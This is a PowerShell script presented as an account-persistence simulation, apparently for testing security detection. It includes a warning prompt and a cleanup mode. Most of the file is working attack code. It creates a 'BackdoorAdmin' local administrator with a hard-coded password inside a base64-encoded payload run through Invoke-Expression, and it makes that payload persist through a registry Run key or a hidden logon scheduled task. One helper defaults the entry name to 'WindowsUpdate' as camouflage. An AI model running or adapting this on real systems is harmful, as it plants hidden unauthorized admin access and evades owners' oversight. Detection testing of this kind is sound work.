param(
    [string][ValidateSet("HKLM", "HKCU", "Scheduler")]$Mode = "HKLM",
    [string]$OutputPath = "$env:TEMP\Persistence",
    [switch]$Cleanup,
    [switch]$Force
)

# Display warning prompt unless Force is specified or in Cleanup mode
if (-not $Force -and -not $Cleanup) {
    Write-Host "`n================================================" -ForegroundColor Yellow
    Write-Host "                 ***  WARNING  *** " -ForegroundColor Red
    Write-Host "     Account Persistence Simulation Script" -ForegroundColor Yellow
    Write-Host "================================================" -ForegroundColor Yellow
    Write-Host "`nThis script will create persistence mechanisms that may be detected as malicious:" -ForegroundColor White
    
    # Describe what will happen based on the mode
    switch ($Mode) {
        "HKLM" {
            Write-Host "  - Create a registry Run key in HKEY_LOCAL_MACHINE" -ForegroundColor Cyan
            Write-Host "    (Requires Administrator privileges)" -ForegroundColor Gray
        }
        "HKCU" {
            Write-Host "  - Create a registry Run key in HKEY_CURRENT_USER" -ForegroundColor Cyan
        }
        "Scheduler" {
            Write-Host "  - Create a scheduled task that runs at logon" -ForegroundColor Cyan
        }
    }
    
    Write-Host "  - Create a base64-encoded PowerShell script" -ForegroundColor Cyan
    Write-Host "  - Create a backdoor user account 'BackdoorAdmin'" -ForegroundColor Cyan
    Write-Host "  - Add the backdoor user to the Administrators group" -ForegroundColor Cyan
    Write-Host "  - Generate persistence logs" -ForegroundColor Cyan
    
    Write-Host "`nMode: $Mode" -ForegroundColor White
    Write-Host "Output will be saved to: $OutputPath" -ForegroundColor White
    Write-Host "`nThis is for TESTING/SIMULATION purposes only." -ForegroundColor Red
    Write-Host "These activities will likely trigger security alerts." -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Yellow
    
    $response = Read-Host "Do you want to continue? (Y/N)"
    if ($response -notmatch '^[Yy]') {
        Write-Host "Script execution cancelled by user." -ForegroundColor Yellow
        return
    }
    Write-Host ""
}

<#
.SYNOPSIS
Creates a Windows Scheduled Task that runs a PowerShell script at logon with hidden execution.

.DESCRIPTION
This function creates a scheduled task that executes a specified PowerShell script at user logon.
The script execution is hidden from the user using -WindowStyle Hidden.

.PARAMETER ScriptPath
The full path to the PowerShell script that will be executed by the scheduled task.

.PARAMETER TaskName
The name of the scheduled task to create. Defaults to "LogonTask".

.PARAMETER Description
Optional description for the scheduled task.

.EXAMPLE
New-LogonScheduledTask -ScriptPath "C:\Scripts\MyScript.ps1" -TaskName "MyLogonTask"

.EXAMPLE
New-LogonScheduledTask -ScriptPath "$env:TEMP\persistence.ps1" -TaskName "PersistenceTask" -Description "Runs at logon"
#>
function New-LogonScheduledTask {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ScriptPath,
        
        [Parameter(Mandatory = $false)]
        [string]$TaskName = "LogonTask",
        
        [Parameter(Mandatory = $false)]
        [string]$Description = "Scheduled task that runs at logon"
    )
    
    try {
        # Validate script path exists
        if (-not (Test-Path -Path $ScriptPath)) {
            Write-Warning "Script path does not exist: $ScriptPath"
        }
        
        # Create an action to run PowerShell with hidden window
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
        
        # Create a trigger to run at logon
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        
        # Create settings for the task
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        
        # Register the scheduled task
        Register-ScheduledTask -TaskName $TaskName `
            -Action $Action `
            -Trigger $Trigger `
            -Settings $Settings `
            -Description $Description `
            -Force | Out-Null
        
        Write-Host "Successfully created scheduled task '$TaskName' that will run '$ScriptPath' at logon (hidden)" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Error "Failed to create scheduled task: $_"
        return $false
    }
}

<#
.SYNOPSIS
Creates a registry-based persistence mechanism using Run key to execute a PowerShell script at logon.

.DESCRIPTION
This function adds a registry entry to either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER Run key
to execute a specified PowerShell script at user logon. HKLM requires administrator privileges.
The script execution is hidden from the user using -WindowStyle Hidden.

.PARAMETER ScriptPath
The full path to the PowerShell script that will be executed at logon.

.PARAMETER RegistryHive
The registry hive to use. Valid values are "HKLM" (requires admin) or "HKCU" (user-level).

.PARAMETER EntryName
The name of the registry entry to create. Defaults to "WindowsUpdate".

.PARAMETER Hidden
Switch to hide the PowerShell window during execution. Enabled by default.

.EXAMPLE
New-RegistryLogonPersistence -ScriptPath "C:\Scripts\MyScript.ps1" -RegistryHive "HKLM" -EntryName "MyApp"

.EXAMPLE
New-RegistryLogonPersistence -ScriptPath "$env:TEMP\persistence.ps1" -RegistryHive "HKCU"

.NOTES
HKLM requires administrator privileges. HKCU does not.
#>
function New-RegistryLogonPersistence {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ScriptPath,
        
        [Parameter(Mandatory = $true)]
        [ValidateSet("HKLM", "HKCU")]
        [string]$RegistryHive,
        
        [Parameter(Mandatory = $false)]
        [string]$EntryName = "WindowsUpdate"
    )
    
    try {
        # Check if running as administrator for HKLM
        if ($RegistryHive -eq "HKLM") {
            $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            if (-not $isAdmin) {
                Write-Error "Writing to HKLM requires administrator privileges."
                return $false
            }
        }
        
        # Validate script path exists
        if (-not (Test-Path -Path $ScriptPath)) {
            Write-Warning "Script path does not exist: $ScriptPath"
        }
        
        # Define the registry path
        $RegistryPath = "$($RegistryHive):\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        
        # Build the PowerShell command to execute the script file
        $Command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File `"$ScriptPath`""
        
        # Create or update the registry entry
        New-ItemProperty -Path $RegistryPath -Name $EntryName -Value $Command -PropertyType String -Force | Out-Null
        
        Write-Host "Successfully created $RegistryHive Run key '$EntryName' that will execute '$ScriptPath' at logon" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Error "Failed to create registry persistence: $_"
        return $false
    }
}


$Name = "AccountPersistence"

# Ensure OutputPath exists
if(-not (Test-Path -Path $OutputPath)) {
    New-Item -Path $OutputPath -ItemType Directory -Force | Out-Null
}

$ScriptPath = "$OutputPath\new-user.ps1"
$LogPath = "$OutputPath\persistence-log.txt"

if($Cleanup) {
    if(($Mode -eq "HKLM") -or ($Mode -eq "HKCU")) {
        $RegistryPath = "$($Mode):\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        if (Test-Path -Path $RegistryPath) {
            Remove-ItemProperty -Path $RegistryPath -Name $Name -ErrorAction SilentlyContinue
            Write-Host "Removed registry persistence entry from $RegistryPath\$Name" -ForegroundColor Green
        }
    }
    elseif ($Mode -eq "Scheduler") {
        if (Get-ScheduledTask -TaskName $Name -ErrorAction SilentlyContinue) {
            Unregister-ScheduledTask -TaskName $Name -Confirm:$false
            Write-Host "Removed scheduled task: $Name" -ForegroundColor Green
        }
    }
    
    # Remove the persistence script file if it exists
    if (Test-Path -Path $ScriptPath) {
        Remove-Item -Path $ScriptPath -Force -ErrorAction SilentlyContinue
        Write-Host "Removed persistence script: $ScriptPath" -ForegroundColor Green
    }
    
    # Remove the backdoor user account if it exists
    $BackdoorUser = "BackdoorAdmin"
    if (Get-LocalUser -Name $BackdoorUser -ErrorAction SilentlyContinue) {
        Remove-LocalUser -Name $BackdoorUser -ErrorAction SilentlyContinue
        Write-Host "Removed backdoor user account: $BackdoorUser" -ForegroundColor Green
    }
    
    # Remove the persistence log file if it exists
    if (Test-Path -Path $LogPath) {
        Remove-Item -Path $LogPath -Force -ErrorAction SilentlyContinue
        Write-Host "Removed persistence log: $LogPath" -ForegroundColor Green
    }
    
    # Remove the output directory if empty
    if ((Test-Path -Path $OutputPath) -and (Get-ChildItem -Path $OutputPath).Count -eq 0) {
        Remove-Item -Path $OutputPath -Force -ErrorAction SilentlyContinue
        Write-Host "Removed empty output directory: $OutputPath" -ForegroundColor Green
    }
}
else {
    # Create the actual payload script content
    $payloadContent = @"
# Persistence marker script with user creation
Write-Host "Persistence mechanism executed at: `$(Get-Date)" -ForegroundColor Yellow
Add-Content -Path "$LogPath" -Value "Executed at: `$(Get-Date)"

# Create a new local user account for persistence
`$Username = "BackdoorAdmin"
`$Password = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force

try {
    # Check if user already exists
    `$userExists = Get-LocalUser -Name `$Username -ErrorAction SilentlyContinue
    
    if (-not `$userExists) {
        # Create new local user
        New-LocalUser -Name `$Username -Password `$Password -FullName "System Administrator" -Description "Backup Administrator Account" -AccountNeverExpires -PasswordNeverExpires -ErrorAction Stop
        Write-Host "Created new user: `$Username" -ForegroundColor Green
        Add-Content -Path "$LogPath" -Value "Created user: `$Username at `$(Get-Date)"
        
        # Add user to Administrators group
        Add-LocalGroupMember -Group "Administrators" -Member `$Username -ErrorAction Stop
        Write-Host "Added `$Username to Administrators group" -ForegroundColor Green
        Add-Content -Path "$LogPath" -Value "Added `$Username to Administrators group at `$(Get-Date)"
    }
    else {
        Write-Host "User `$Username already exists" -ForegroundColor Yellow
        Add-Content -Path "$LogPath" -Value "User `$Username already exists at `$(Get-Date)"
    }
}
catch {
    Write-Error "Failed to create user: `$_"
    Add-Content -Path "$LogPath" -Value "Error creating user: `$_ at `$(Get-Date)"
}
"@
    
    # Encode the payload in base64
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadContent)
    $encodedPayload = [Convert]::ToBase64String($bytes)
    
    # Create wrapper script that decodes and executes the base64 payload
    $scriptContent = @"
# Base64 encoded payload
`$encodedCommand = @'
$encodedPayload
'@

# Decode and execute
`$bytes = [System.Convert]::FromBase64String(`$encodedCommand)
`$decodedScript = [System.Text.Encoding]::Unicode.GetString(`$bytes)
Invoke-Expression `$decodedScript
"@
    
    Set-Content -Path $ScriptPath -Value $scriptContent -Force
    Write-Host "Created base64-encoded persistence script with user creation: $ScriptPath" -ForegroundColor Green
    
    if(($Mode -eq "HKLM") -or ($Mode -eq "HKCU")) {
        New-RegistryLogonPersistence -ScriptPath $ScriptPath -RegistryHive $Mode -EntryName $Name
    }
    elseif ($Mode -eq "Scheduler") {
        New-LogonScheduledTask -ScriptPath $ScriptPath -TaskName $Name -Description "Runs a malicious PowerShell script at logon"
    }
    else {
        Write-Error "The Mode isn't valid."
    }
}